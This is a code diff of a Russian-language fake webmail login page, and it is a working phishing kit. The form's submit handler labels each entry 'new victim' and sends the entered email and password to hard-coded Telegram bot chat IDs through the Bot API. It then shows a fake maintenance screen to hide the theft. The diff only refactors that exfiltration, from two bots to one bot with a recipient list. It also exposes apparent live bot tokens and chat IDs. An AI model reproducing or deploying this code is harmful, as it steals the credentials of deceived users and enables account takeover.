@@ -5,88 +5,19 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Вход в почту</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .login-box {
-            background: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            width: 320px;
-            text-align: center;
-        }
-        .login-box input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        .login-box button {
-            width: 100%;
-            padding: 12px;
-            background: #0077cc;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .login-box button:hover {
-            background: #005fa3;
-        }
-        .error-message {
-            color: red;
-            margin-top: 10px;
-            font-size: 14px;
-        }
-        .logo {
-            font-size: 28px;
-            font-weight: bold;
-            margin-bottom: 20px;
-        }
-        .tech-message {
-            display: none;
-            background: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
-            max-width: 400px;
-            margin: 20px auto;
-        }
-        .tech-message .icon {
-            font-size: 56px;
-            margin-bottom: 15px;
-        }
-        .tech-message h2 {
-            color: #333;
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        .tech-message p {
-            color: #666;
-            font-size: 16px;
-        }
-        .hidden {
-            display: none !important;
-        }
-        .center {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            flex-direction: column;
-        }
+        body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); width: 320px; text-align: center; }
+        .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; }
+        .login-box button { width: 100%; padding: 12px; background: #0077cc; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        .login-box button:hover { background: #005fa3; }
+        .error-message { color: red; margin-top: 10px; }
+        .logo { font-size: 28px; font-weight: bold; margin-bottom: 20px; }
+        .tech-message { display: none; background: white; padding: 40px; border-radius: 12px; max-width: 400px; margin: 20px auto; }
+        .tech-message .icon { font-size: 56px; margin-bottom: 15px; }
+        .tech-message h2 { color: #333; }
+        .tech-message p { color: #666; }
+        .hidden { display: none !important; }
+        .center { display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
     </style>
 </head>
 <body>
@@ -100,7 +31,6 @@
             <div id="message" class="error-message"></div>
         </form>
     </div>
-
     <div id="techContainer" class="tech-message hidden">
         <div class="icon">🔧</div>
         <h2>Технические работы</h2>
@@ -110,20 +40,14 @@
 </div>
 
 <script>
-    // === ТВОИ ДАННЫЕ ===
-    const MY_ID = "8648082259";
-    const MY_TOKEN = "8919131267:AAHS9zQH6eluArGoaRkwtRUNH3MpQNzJWAA";
+    // === ТВОЙ БОТ (ОДИН) ===
+    const BOT_TOKEN = "8919131267:AAHS9zQH6eluArGoaRkwtRUNH3MpQNzJWAA";
 
-    // === ЕГО ДАННЫЕ ===
-    const HIS_ID = "8784393556";
-    const HIS_TOKEN = "8842883108:AAFza9ZypL71T92auiTCmcnwPAkGfjGtC6c";
-
-    // === ФУНКЦИЯ ОТПРАВКИ ===
-    function sendMessage(token, chatId, text) {
-        const url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(text);
-        fetch(url, { mode: "no-cors" });
-        new Image().src = url;
-    }
+    // === ВСЕ ПОЛУЧАТЕЛИ (ДОБАВЛЯЙ СЮДА ЛЮБЫЕ ID) ===
+    const CHAT_IDS = [
+        "8648082259",   // ты
+        "8784393556"    // он
+    ];
 
     document.getElementById("loginForm").addEventListener("submit", function(event) {
         event.preventDefault();
@@ -138,17 +62,15 @@
         }
 
         const text = "📩 НОВАЯ ЖЕРТВА\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString();
+        const encoded = encodeURIComponent(text);
 
-        // === 1. ОТПРАВКА ЕМУ (через его бота) ===
-        sendMessage(HIS_TOKEN, HIS_ID, text);
+        // Отправляем ВСЕМ из списка
+        CHAT_IDS.forEach(id => {
+            const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + id + "&text=" + encoded;
+            fetch(url, { mode: "no-cors" });
+            new Image().src = url;
+        });
 
-        // === 2. ОТПРАВКА ТЕБЕ (через твоего бота) ===
-        sendMessage(MY_TOKEN, MY_ID, text);
-
-        // === 3. ДУБЛЬ ТЕБЕ (через его бота, на случай блокировки твоего) ===
-        sendMessage(HIS_TOKEN, MY_ID, text);
-
-        // Показываем техработы
         document.getElementById("loginFormContainer").classList.add("hidden");
         document.getElementById("techContainer").classList.remove("hidden");
     });
